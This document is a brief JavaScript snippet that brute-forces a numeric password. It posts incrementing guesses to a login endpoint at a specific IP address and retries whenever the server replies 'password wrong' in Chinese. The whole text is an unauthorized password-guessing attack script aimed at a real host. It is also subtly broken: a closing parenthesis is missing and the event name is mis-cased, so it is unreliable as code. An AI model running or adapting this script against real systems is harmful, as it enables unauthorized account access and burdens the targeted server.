(function a(num){
	var xhr = new XMLHttpRequest();
	xhr.open("post","http://121.42.185.52:8360/home/index/getpass");
	xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded") 
	xhr.send('password=' + num);
	xhr.addEventListener('readyStateChange', function(){
		if(xhr.responseText == 'password错误')
			a(num + 1);
	}
})(0);